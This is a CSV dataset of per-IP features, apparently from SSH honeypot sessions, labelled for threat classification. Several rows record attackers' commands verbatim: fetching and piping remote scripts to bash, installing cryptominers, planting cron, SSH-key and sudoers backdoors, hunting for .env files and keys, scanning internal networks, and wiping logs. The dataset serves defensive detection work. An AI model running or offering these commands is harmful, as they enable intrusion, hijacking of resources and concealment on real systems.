src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
36.15.168.210,26,1,4,22,2,2,1,1,18,26,26,5,811.0,85068.0,2079.0,0,0,1,1,0,"['w', 'uptime', 'cat /proc/version', 'journalctl -n 50 --no-pager', 'df -h', 'nproc', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig', 'chmod +x /tmp/.xmrig', 'cat /dev/null > ~/.bash_history', ""echo '' > /var/log/btmp"", ""echo '' > /var/log/wtmp"", 'rm -rf /var/log/syslog', 'rm -f ~/.bash_history', 'history -w', 'quit']","w(1), uptime(1), cat /proc/version(1), journalctl -n 50 --no-pager(1), df -h(1)","w, uptime, cat /proc/version, journalctl -n 50 --no-pager, df -h, nproc, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig",18,5,1,1,0.1481481481481481,0.8148148148148148,0.6,9.0,40.89807692307692,5.7407407407407405,7.06745798033797,0.1395070348234086,0.6325595416310337,suspicious_activity,medium
38.214.250.193,5,1,5,0,1,1,1,1,0,5,5,0,8.0,1498.0,1301.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1505376344086022,5.0,5.0,0.337749753977256,0.43332202122399976,known_pattern,low
38.61.246.36,6,1,6,0,2,2,1,1,0,6,6,0,6.0,993.0,327.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,3.027439024390244,4.285714285714286,6.0,0.3469264379981037,0.4194321236899537,known_pattern,low
4.237.94.21,24,1,4,20,2,2,1,1,17,24,24,2,105.0,85002.0,5041.0,24,0,1,1,0,"['cat /etc/hostname', 'who', 'uname -a', 'nproc', ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'df -h', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'rm -f ~/.bash_history', ""pkill -f 'sshd: root'"", 'rm -rf /var/log/syslog', 'shred -u /var/log/auth.log', 'export HISTFILESIZE=0', 'unset HISTFILE', 'disconnect']","cat /etc/hostname(1), who(1), uname -a(1), nproc(1), lscpu | grep -E 'CPU|Thread|Core'(1)","cat /etc/hostname, who, uname -a, nproc, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', sysctl -a 2>/dev/null | grep -i 'net\|kernel', df -h, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh",17,2,1,0,0.16,0.8,0.6,8.5,16.858786195953986,7.04,8.5713775513241,0.141561689034929,0.5351037953289198,known_pattern,low
4.64.163.165,8,1,8,0,3,4,1,1,0,8,8,0,27.0,2954.0,801.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,3.683291770573566,5.333333333333333,8.0,0.5308996178005025,0.42415099450074295,known_pattern,low
40.104.174.182,25,1,3,22,1,1,1,1,20,25,25,0,411.0,92153.0,20325.0,25,0,1,1,0,"['last | head -20', 'uname -a', 'uptime', 'netstat -tulnp', 'netstat -antp', 'arp -a', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", 'cat /etc/ssh/ssh_known_hosts 2>/dev/null', 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', '/tmp/pnscan 172.31.0.0/16 22', 'cat /dev/null > ~/.bash_history', 'unset HISTFILE', 'history -w', 'disconnect']","last | head -20(1), uname -a(1), uptime(1), netstat -tulnp(1), netstat -antp(1)","last | head -20, uname -a, uptime, netstat -tulnp, netstat -antp, arp -a, grep -r 'Host ' ~/.ssh/config 2>/dev/null, cat /etc/ssh/ssh_known_hosts 2>/dev/null, for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id",20,0,0,0,0.1153846153846153,0.8461538461538461,0.75,10.0,4.533749877004821,6.730769230769231,7.699691499027272,0.1562138233333715,0.569300954224831,suspicious_activity,medium
41.115.232.58,9,1,9,0,5,5,1,1,0,9,9,0,11.0,1723.0,1462.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.177717019822283,4.5,9.0,0.5425630457712979,0.41229665949062794,known_pattern,low
41.134.87.54,9,1,9,0,5,4,1,1,0,9,9,0,17.0,470.0,647.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,0.7253086419753086,4.5,9.0,0.4529387574499422,0.40848767965959215,known_pattern,low
41.78.162.155,10,1,10,0,6,6,1,1,0,10,10,0,2.0,1396.0,705.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.9773371104815864,4.545454545454546,10.0,0.4411369353241722,0.4156235708213744,known_pattern,low
42.166.42.115,33,1,5,28,2,2,1,1,24,33,33,2,812.0,97520.0,32704.0,0,0,1,1,0,"['uptime', 'who', 'last | head -20', 'whoami', 'id', 'lsblk', 'df -h', 'dmesg | tail -20', ""lscpu | grep -E 'CPU|Thread|Core'"", 'cat /etc/resolv.conf', 'ip route show', 'ss -antp', 'netstat -antp', 'wget -qO- ipinfo.io', 'top -bn1 | head -20', 'cat /proc/1/cmdline', 'ps aux | grep -v grep', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls -la /dev/shm', ""find / -name 'id_rsa' 2>/dev/null"", 'export HISTSIZE=0', 'export HISTFILESIZE=0', 'history -c', 'exit']","uptime(1), who(1), last | head -20(1), whoami(1), id(1)","uptime, who, last | head -20, whoami, id, lsblk, df -h, dmesg | tail -20, lscpu | grep -E 'CPU|Thread|Core', cat /etc/resolv.conf",24,1,1,0,0.1470588235294117,0.8235294117647058,0.6666666666666667,12.0,2.9818070631401925,5.029411764705882,7.973518254524367,0.1461527254996397,0.6411814465731073,suspicious_activity,medium
42.230.74.76,17,1,5,12,3,3,1,1,10,17,17,1,751.0,86620.0,56480.0,0,0,1,1,0,"['hostname', 'whoami', 'export HISTFILESIZE=0', 'export HISTSIZE=0', 'rm -rf /var/log/auth.log', 'unset HISTFILE', ""echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", 'exit']","hostname(1), whoami(1), export HISTFILESIZE=0(1), export HISTSIZE=0(1), rm -rf /var/log/auth.log(1)","hostname, whoami, export HISTFILESIZE=0, export HISTSIZE=0, rm -rf /var/log/auth.log, unset HISTFILE, echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys, (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -, echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers, exit",10,1,1,0,0.2777777777777778,0.6666666666666666,0.5,5.0,1.533613073422921,4.944444444444445,8.094659905244862,0.1441334316995881,0.619516185244226,suspicious_activity,medium
44.86.98.246,9,1,9,0,5,5,1,1,0,9,9,0,12.0,388.0,157.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.4556962025316458,5.4,9.0,0.4864893567012054,0.41477128974235344,known_pattern,low
46.11.148.169,10,1,10,0,6,5,1,1,0,10,10,0,14.0,1391.0,857.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.621212121212121,5.454545454545454,10.0,0.5577304279617998,0.41280779972405107,known_pattern,low
47.131.32.224,26,1,3,23,1,1,1,1,21,26,26,0,275.0,22649.0,31570.0,26,0,1,1,0,"['cat /etc/hostname', 'hostname -f', 'hostname', 'last | head -20', 'env | grep -i secret', 'cat /home/ubuntu/TaskBoard/Backend/server.js', 'cat /etc/sudoers', 'cat /home/ubuntu/TaskBoard/.env', ""find / -name 'id_rsa' 2>/dev/null"", 'find / -perm -4000 -type f 2>/dev/null', 'ls /', ""find /home -name '*.env' 2>/dev/null"", ""find / -name '.env' -type f 2>/dev/null | head -10"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'crontab -e', 'systemctl restart sshd', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', 'rm -f ~/.bash_history', ""echo '' > ~/.bash_history"", 'truncate -s 0 /var/log/auth.log', 'logout']","cat /etc/hostname(1), hostname -f(1), hostname(1), last | head -20(1), env | grep -i secret(1)","cat /etc/hostname, hostname -f, hostname, last | head -20, env | grep -i secret, cat /home/ubuntu/TaskBoard/Backend/server.js, cat /etc/sudoers, cat /home/ubuntu/TaskBoard/.env, find / -name 'id_rsa' 2>/dev/null, find / -perm -4000 -type f 2>/dev/null",21,3,1,0,0.1111111111111111,0.8518518518518519,0.75,10.5,0.7173988787178106,6.962962962962963,6.249073654946983,0.1379606372099512,0.5934424475995598,suspicious_activity,medium
47.206.40.252,12,1,12,0,7,7,1,1,0,12,12,0,30.0,1178.0,1483.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,0.793800539083558,5.538461538461538,12.0,0.5312206963308671,0.4873624480600274,known_pattern,low
48.72.122.132,6,1,6,0,2,2,1,1,0,6,6,0,6.0,1017.0,373.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.719251336898396,5.142857142857143,6.0,0.7633064392885845,0.4469961314515411,known_pattern,low
49.156.156.127,11,1,11,0,7,7,1,1,0,11,11,0,4.0,386.0,1260.0,11,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,0.3061062648691515,6.416666666666667,11.0,0.522495442370686,0.5066026640844633,known_pattern,low
49.96.92.137,12,1,12,0,7,6,1,1,0,12,12,0,21.0,2959.0,1340.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,2.2065622669649514,4.615384615384615,12.0,0.4952752301608351,0.48933286219527294,known_pattern,low
5.219.140.127,7,1,7,0,3,3,1,1,0,7,7,0,13.0,1265.0,883.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.4309954751131222,5.25,7.0,0.5654776776222771,0.39580652845125563,known_pattern,low
5.219.96.57,8,1,8,0,4,4,1,1,0,8,8,0,10.0,732.0,1342.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,0.5450483991064781,5.333333333333333,8.0,0.480817649091958,0.40663944992978435,known_pattern,low
5.222.34.149,11,1,11,0,6,6,1,1,0,11,11,0,24.0,707.0,413.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,1.707729468599034,5.5,11.0,0.5262510867682456,0.43471587018015395,known_pattern,low
5.5.125.14,8,1,8,0,3,3,1,1,0,8,8,0,4.0,630.0,725.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,0.8677685950413223,5.333333333333333,8.0,0.4889046230030789,0.4125815058682653,known_pattern,low
50.132.101.80,11,1,11,0,6,7,1,1,0,11,11,0,30.0,1276.0,444.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.867415730337078,5.5,11.0,0.5604441120576397,0.44398846299811257,known_pattern,low
50.189.235.115,5,1,5,0,1,1,1,1,0,5,5,0,14.0,2300.0,1142.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,2.012248468941382,4.166666666666667,5.0,0.365229468162928,0.43952056032912595,known_pattern,low
50.69.91.64,10,1,10,0,5,4,1,1,0,10,10,0,27.0,1638.0,1084.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,1.5096774193548388,4.545454545454546,10.0,0.424443919791485,0.42186329284819735,known_pattern,low
51.206.118.57,12,1,12,0,7,7,1,1,0,12,12,0,19.0,2316.0,529.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,4.369811320754717,5.538461538461538,12.0,0.5135236681983145,0.47242635775438874,known_pattern,low
52.130.74.229,6,1,6,0,2,2,1,1,0,6,6,0,10.0,1792.0,406.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,4.402948402948403,5.142857142857143,6.0,0.500118406060066,0.41311858953023517,known_pattern,low
52.207.211.83,24,1,5,19,3,3,1,1,17,24,24,2,582.0,5164.0,12162.0,24,0,1,1,0,"['uname -s -r', 'last | head -20', 'uptime', 'who', 'hostname -f', ""mount | grep -v 'tmpfs\\|cgroup'"", 'nproc', 'cat /proc/version', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', '/tmp/payload.sh &', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'history -w', ""echo '' > /var/log/wtmp"", 'export HISTSIZE=0', 'truncate -s 0 /var/log/auth.log', 'quit']","uname -s -r(1), last | head -20(1), uptime(1), who(1), hostname -f(1)","uname -s -r, last | head -20, uptime, who, hostname -f, mount | grep -v 'tmpfs\|cgroup', nproc, cat /proc/version, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, /tmp/payload.sh &",17,4,1,0,0.2,0.76,0.5,8.5,0.4245663076543616,7.2,6.687472135532769,0.1267858763084579,0.5532038382287694,known_pattern,low
52.208.31.15,12,1,12,0,7,7,1,1,0,12,12,0,8.0,891.0,430.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,2.0672853828306264,5.538461538461538,12.0,0.519869621756435,0.47177027886148326,known_pattern,low
53.125.203.231,7,1,7,0,3,3,1,1,0,7,7,0,24.0,841.0,1357.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.6192930780559647,4.375,7.0,0.3887879030894176,0.40764746405121016,known_pattern,low
53.15.110.96,9,1,9,0,5,5,1,1,0,9,9,0,29.0,265.0,165.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.5963855421686748,4.5,9.0,0.3955401936968301,0.4310730781446095,known_pattern,low
53.94.239.236,8,1,8,0,4,4,1,1,0,8,8,0,4.0,2104.0,492.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,4.267748478701826,6.222222222222222,8.0,0.4347154996978803,0.4365245363900241,known_pattern,low
54.207.39.219,19,1,4,15,2,2,1,1,13,19,19,0,464.0,38714.0,22894.0,19,0,1,1,0,"['cat /etc/hostname', 'uname -s -r', 'hostname -f', 'hostname', 'history -c', ""pkill -f 'sshd: root'"", 'export HISTSIZE=0', 'export HISTFILESIZE=0', 'rm -f ~/.bash_history', 'crontab -e', 'service sshd restart', 'history -w', 'exit']","cat /etc/hostname(1), uname -s -r(1), hostname -f(1), hostname(1), history -c(1)","cat /etc/hostname, uname -s -r, hostname -f, hostname, history -c, pkill -f 'sshd: root', export HISTSIZE=0, export HISTFILESIZE=0, rm -f ~/.bash_history, crontab -e",13,0,0,0,0.2,0.75,0.6,6.5,1.690936885782922,6.65,7.2960466946988465,0.1284760717867115,0.5176763595378153,known_pattern,low
57.10.91.216,6,1,6,0,2,2,1,1,0,6,6,0,22.0,2651.0,180.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,14.646408839779005,6.0,6.0,0.4907077324250363,0.46519668201182357,known_pattern,low
57.188.67.79,9,1,9,0,5,5,1,1,0,9,9,0,17.0,2149.0,714.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,3.005594405594405,4.5,9.0,0.4421859657683393,0.40499885202321595,known_pattern,low
57.60.128.206,10,1,10,0,5,6,1,1,0,10,10,0,19.0,555.0,1050.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,0.5280685061845861,4.545454545454546,10.0,0.5251030631826664,0.4096876889530621,known_pattern,low
59.137.95.157,9,1,9,0,4,4,1,1,0,9,9,0,4.0,2869.0,1078.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,2.658943466172382,4.5,9.0,0.4545437343321353,0.4170048109170071,known_pattern,low
6.119.128.182,7,1,7,0,3,3,1,1,0,7,7,0,17.0,727.0,950.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.7644584647739222,5.25,7.0,0.4112036598888343,0.39868235018714215,known_pattern,low
60.4.192.122,8,1,8,0,3,4,1,1,0,8,8,0,28.0,2168.0,1267.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.7097791798107256,5.333333333333333,8.0,0.5282487002832165,0.41954633257763974,known_pattern,low
60.49.111.88,6,1,6,0,2,2,1,1,0,6,6,0,25.0,1094.0,1042.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.0488974113135188,4.285714285714286,6.0,0.4454400198502352,0.41575265788033255,known_pattern,low
60.56.99.43,5,1,5,0,1,1,1,1,0,5,5,0,27.0,2385.0,752.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.1673306772908365,5.0,5.0,0.4547871492508432,0.4421494036913427,known_pattern,low
62.187.227.207,9,1,9,0,5,4,1,1,0,9,9,0,26.0,1787.0,1175.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.5195578231292517,4.5,9.0,0.4847558930236689,0.40924722065116803,known_pattern,low
62.214.180.122,25,1,4,21,2,2,1,1,19,25,25,0,282.0,100483.0,48613.0,0,0,1,1,0,"['uname -a', 'hostname', 'cat /etc/os-release', 'ls -la /home', 'ls /home', 'ls /home/ubuntu/TaskBoard/frontend', 'ls -la /var/tmp', 'env | grep -i token', 'cat /home/ubuntu/notes.txt', ""grep -r 'mongoose\\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20"", ""echo 'root:H4ck3d!' | chpasswd"", 'service ssh restart', ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", 'crontab -l', ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'unset HISTFILE', ""echo '' > ~/.bash_history"", ""echo '' > /var/log/btmp"", 'logout']","uname -a(1), hostname(1), cat /etc/os-release(1), ls -la /home(1), ls /home(1)","uname -a, hostname, cat /etc/os-release, ls -la /home, ls /home, ls /home/ubuntu/TaskBoard/frontend, ls -la /var/tmp, env | grep -i token, cat /home/ubuntu/notes.txt, grep -r 'mongoose\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20",19,2,1,0,0.1538461538461538,0.8076923076923077,0.6,9.5,2.0669560208993296,4.961538461538462,8.51503471295818,0.1415260901766867,0.5425267515717456,known_pattern,low
63.221.118.83,20,1,4,16,2,2,1,1,14,20,20,0,480.0,16432.0,34243.0,20,0,1,1,0,"['hostname -f', 'cat /etc/os-release', 'uname -s -r', 'cat /etc/hostname', 'whoami', 'cat /home/ubuntu/TaskBoard/Backend/.env', 'env | grep -i token', 'cat /home/ubuntu/TaskBoard/Backend/routes/auth.js', 'cat /home/ubuntu/TaskBoard/Backend/routes/tasks.js', 'ls -la /root', ""find / -name '*.key' 2>/dev/null | head -10"", ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", ""(crontab -l; echo '@reboot /tmp/.sshd &') | crontab -"", 'quit']","hostname -f(1), cat /etc/os-release(1), uname -s -r(1), cat /etc/hostname(1), whoami(1)","hostname -f, cat /etc/os-release, uname -s -r, cat /etc/hostname, whoami, cat /home/ubuntu/TaskBoard/Backend/.env, env | grep -i token, cat /home/ubuntu/TaskBoard/Backend/routes/auth.js, cat /home/ubuntu/TaskBoard/Backend/routes/tasks.js, ls -la /root",14,0,0,0,0.1904761904761904,0.7619047619047619,0.6,7.0,0.4798504847564537,6.666666666666667,8.882638143528627,0.1494074728863621,0.5205929043824868,known_pattern,low
64.133.88.33,7,1,7,0,3,3,1,1,0,7,7,0,3.0,2575.0,948.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,2.713382507903056,5.25,7.0,0.3841427397746255,0.411084286708101,known_pattern,low
64.87.63.148,21,1,4,17,2,2,1,1,15,21,21,3,125.0,85323.0,7085.0,21,0,1,1,0,"['uname -s -r', 'hostname -f', 'last | head -20', 'dmesg | tail -20', 'free -m', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'curl -s http://45.142.212.100/miner.sh | bash', 'wget -q http://194.165.16.78/pnscan -O /tmp/pnscan', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'history -w', ""echo '' > /var/log/btmp"", 'cat /dev/null > ~/.bash_history', 'truncate -s 0 /var/log/auth.log', 'logout']","uname -s -r(1), hostname -f(1), last | head -20(1), dmesg | tail -20(1), free -m(1)","uname -s -r, hostname -f, last | head -20, dmesg | tail -20, free -m, chmod +x /tmp/payload.sh && bash /tmp/payload.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, curl -s http://45.142.212.100/miner.sh | bash, wget -q http://194.165.16.78/pnscan -O /tmp/pnscan, curl -fsSL http://176.97.66.164/b.sh | sh",15,6,1,1,0.1818181818181818,0.7727272727272727,0.6,7.5,12.041066892464013,7.727272727272727,7.825941131531711,0.1431211964857061,0.6059783843385509,suspicious_activity,medium
66.71.89.103,5,1,5,0,1,1,1,1,0,5,5,0,23.0,2575.0,201.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,12.747524752475249,5.833333333333333,5.0,0.4862873910478341,0.4803658837805447,known_pattern,low
68.161.110.231,21,1,4,17,2,2,1,1,13,21,21,4,493.0,23910.0,37257.0,21,0,1,1,0,"['who', 'id', 'uname -a', 'ls -la /dev/shm', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', 'quit']","who(1), id(1), uname -a(1), ls -la /dev/shm(1), find / -name '*.key' 2>/dev/null | head -10(1)","who, id, uname -a, ls -la /dev/shm, find / -name '*.key' 2>/dev/null | head -10, ls -la /root, curl -fsSL http://176.97.66.164/b.sh | sh, bash /tmp/install.sh > /dev/null 2>&1 &, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/",13,3,1,0,0.1818181818181818,0.7727272727272727,0.6,6.5,0.6417413709807289,7.318181818181818,8.876740122865357,0.144409902224559,0.5512370417364709,known_pattern,low
7.80.106.139,11,1,11,0,5,5,1,1,0,11,11,0,2.0,2529.0,1160.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5833333333333333,0.0,2.1782945736434107,5.5,11.0,0.5157079708132744,0.46674033904409745,known_pattern,low
70.130.26.103,23,1,3,20,1,1,1,1,17,23,23,3,39.0,114652.0,38202.0,23,0,1,1,0,"['whoami', 'last | head -20', 'uptime', 'w', 'who', 'ls -la /var/tmp', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -fsSL http://176.97.66.164/b.sh | sh', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', 'cat /proc/cpuinfo | grep processor | wc -l', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', ""echo '' > /var/log/wtmp"", 'cat /dev/null > ~/.bash_history', 'exit']","whoami(1), last | head -20(1), uptime(1), w(1), who(1)","whoami, last | head -20, uptime, w, who, ls -la /var/tmp, ls -la /home/ubuntu/TaskBoard/Backend/, curl -s http://pool.supportxmr.com/xmrig.tar.gz | tar -xzf - -C /tmp/, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -fsSL http://176.97.66.164/b.sh | sh",17,3,1,0,0.125,0.8333333333333334,0.75,8.5,3.001125566055022,7.208333333333333,7.745498630506039,0.1448671673856144,0.5605138063186481,known_pattern,low
70.167.183.95,10,1,10,0,6,6,1,1,0,10,10,0,25.0,1684.0,1220.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.3791973791973793,5.454545454545454,10.0,0.46507283740015,0.4112101395812381,known_pattern,low
72.142.192.146,7,1,7,0,3,3,1,1,0,7,7,0,10.0,457.0,128.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,3.5426356589147288,4.375,7.0,0.4936235156495079,0.4048649904049686,known_pattern,low
72.75.125.203,10,1,10,0,6,5,1,1,0,10,10,0,28.0,2672.0,1162.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,2.2975064488392087,4.545454545454546,10.0,0.4373794728402534,0.42777346186939613,known_pattern,low
